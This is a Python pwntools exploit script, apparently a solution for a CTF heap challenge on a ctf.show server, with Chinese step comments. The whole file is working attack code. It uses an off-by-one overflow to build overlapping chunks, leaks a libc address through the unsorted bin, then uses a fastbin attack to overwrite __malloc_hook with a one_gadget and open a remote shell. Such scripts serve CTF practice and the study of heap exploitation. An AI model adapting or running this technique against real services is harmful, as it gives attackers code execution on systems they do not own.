from pwn import *

context(log_level='debug', arch='amd64', os='linux')

io = remote("pwn.challenge.ctf.show", 28291)

def cmd(x):
    io.recvuntil(b'Choice: ')
    io.sendline(str(x))

def add(size):
    cmd(1)
    io.recvuntil(b'size: ')
    io.sendline(str(size))

def edit(index, size, data):
    cmd(2)
    io.recvuntil(b'index: ')
    io.sendline(str(index))
    io.recvuntil(b'size: ')
    io.sendline(str(size))
    io.recvuntil(b'content: ')
    io.send(data)

def delete(index):
    cmd(3)
    io.recvuntil(b'index: ')
    io.sendline(str(index))

def show(index):
    cmd(4)
    io.recvuntil(b'index: ')
    io.sendline(str(index))

libc = ELF('./libc-2.23.so')
print("malloc_hook: " + hex(libc.sym['__malloc_hook']))
print("realloc: " + hex(libc.sym['realloc']))

# === Step 1: 布局 4 个 0x68 大小的 chunk ===
add(0x68)   # chunk 0 - off-by-one 溢出源
add(0x68)   # chunk 1 - 将被 size 篡改
add(0x68)   # chunk 2 - 被 overlapping 覆盖
add(0x68)   # chunk 3 - 守卫块

# === Step 2: off-by-one 修改 chunk1 的 size ===
# 把 chunk1 的 size 从 0x71 改成 0xe1 (覆盖 chunk1+chunk2)
show(2)
payload = p64(0) * 13 + p8(0xe1)
edit(0, 0x68 + 10, payload)  # 触发 off-by-one

# === Step 3: free chunk1 (size=0xe1), 进入 unsorted bin ===
delete(1)

# === Step 4: 重新申请 chunk1, chunk2 中留下 unsorted bin 指针 ===
add(0x68)   # chunk 1 - 从 unsorted bin 切割出来

# === Step 5: 泄露 libc ===
show(2)     # chunk2 的 fd/bk 指向 main_arena+88
io.recvuntil(b': ')
leak = u64(io.recv(6).ljust(8, b'\x00'))
libc_base = leak - 0x3c4b78
malloc_hook = libc_base + libc.sym['__malloc_hook']
realloc = libc_base + libc.sym['realloc']
one_gadget = libc_base + 0x4526a

log.success("leak:         0x%x" % leak)
log.success("libc_base:    0x%x" % libc_base)
log.success("malloc_hook:  0x%x" % malloc_hook)
log.success("one_gadget:   0x%x" % one_gadget)

# === Step 6: 再次 off-by-one + fastbin dup ===
add(0x68)   # chunk 4 - 把剩余的 unsorted bin 碎片申请出来

# 再次 off-by-one 修改 chunk1 的 size
edit(0, 0x68 + 10, payload)
delete(1)

# 申请 0xd0 大小的 chunk, 更新 notes[1].size = 0xd0
add(0xd0)   # chunk 1 - 大小 0xe0, 覆盖 chunk2

# 修复 chunk2 的 size 为 0x71 (fastbin 大小)
payload2 = p64(0) * 13 + p64(0x71)
edit(1, len(payload2), payload2)

# free chunk2 进入 fastbin
delete(2)

# === Step 7: 篡改 chunk2 的 fd 指向 malloc_hook-0x23 ===
edit(4, 0x8, p64(malloc_hook - 0x23))

# === Step 8: fastbin attack, 分配到 malloc_hook 附近 ===
add(0x68)   # chunk 2 - 正常分配
add(0x68)   # chunk 5 - 分配到 malloc_hook-0x23 处

# === Step 9: 写入 one_gadget + realloc 调栈 ===
payload3 = b'a' * (0x13 - 8) + p64(one_gadget) + p64(realloc)
edit(5, len(payload3), payload3)

# === Step 10: 触发 malloc -> __malloc_hook -> one_gadget ===
add(0x68)

io.interactive()
